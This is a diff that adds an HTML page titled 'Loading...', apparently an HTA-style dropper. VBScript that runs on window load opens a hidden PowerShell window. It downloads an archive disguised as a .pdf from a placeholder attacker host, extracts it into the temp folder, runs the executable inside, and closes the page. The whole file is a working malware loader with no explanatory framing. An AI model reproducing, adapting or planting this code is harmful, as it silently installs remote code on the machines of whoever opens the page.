@@ -1,0 +1,15 @@
+<html>
+<head>
+<title>Loading...</title>
+<script language="VBScript">
+Sub Window_OnLoad
+    Dim shell
+    Set shell = CreateObject("WScript.Shell")
+    shell.Run "powershell.exe -NoProfile -WindowStyle Hidden -Command ""$rand=[guid]::NewGuid().ToString().Replace('-','');curl.exe -s -L -o '$env:TEMP\$rand.pdf' 'http://[attacker-ip]/socket';mkdir '$env:TEMP\$rand';tar.exe -xf '$env:TEMP\$rand.pdf' -C '$env:TEMP\$rand';& '$env:TEMP\$rand\glaxnimate.exe'""", 0, False
+    window.close
+End Sub
+</script>
+</head>
+<body>
+</body>
+</html>
